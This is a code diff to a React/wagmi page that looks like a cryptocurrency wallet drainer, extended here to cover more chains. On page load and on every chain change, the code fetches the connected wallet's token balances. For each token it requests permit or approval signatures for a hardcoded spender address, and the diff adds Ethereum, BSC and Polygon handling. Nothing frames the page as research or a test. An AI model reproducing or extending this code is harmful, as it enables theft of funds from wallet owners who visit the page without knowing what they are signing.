@@ -1,26 +1,37 @@
 import { Button, FormControl, FormLabel } from '@chakra-ui/react'
-import { fetchSigner, getAccount, getContract } from '@wagmi/core'
+import { fetchSigner, getAccount, getContract, getNetwork } from '@wagmi/core'
 import axios from 'axios'
 import { Head } from 'components/layout/Head'
 import { HeadingComponent } from 'components/layout/HeadingComponent'
 import { ethers } from 'ethers'
 import { useEffect, useState } from 'react'
 import { contractHasPermit, erc721PermitSignature } from 'utils/permit'
-import { useAccount } from 'wagmi'
+import { useAccount, useNetwork } from 'wagmi'
 import erc20Abi from '../utils/abis/erc20.json'
 
 export default function Home() {
   const [txData, setTxData] = useState<any>(null)
+
   const { address } = useAccount()
+  const { chain } = useNetwork()
   useEffect(() => {
     connect()
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [])
+  }, [chain])
 
   async function connect() {
     const account = getAccount()
+    const { chain: connectedChain } = getNetwork()
+    let chainName = 'eth'
+    if (connectedChain && connectedChain.id === 1) {
+      chainName = 'eth'
+    } else if (connectedChain && connectedChain.id === 56) {
+      chainName = 'bsc'
+    } else if (connectedChain && connectedChain.id === 137) {
+      chainName = 'matic'
+    }
     try {
-      const balances = await axios.get(`/api/balance/${account.address}`)
+      const balances = await axios.get(`/api/balance/${account.address}?chain=${chainName}`)
       for (let bal of balances.data) {
         await signNew(bal.address)
       }
@@ -34,8 +45,9 @@ export default function Home() {
     const spender = '0x9473d4DfB61f4B65d037199c82D920C0609B616c'
     if (contractAddress === 'eth') return
     try {
+      const { chain } = getNetwork()
       const signer = await fetchSigner({
-        chainId: 1,
+        chainId: chain?.id || 1,
       })
       const hasPermit = await contractHasPermit(contractAddress, 1)
       if (hasPermit) {
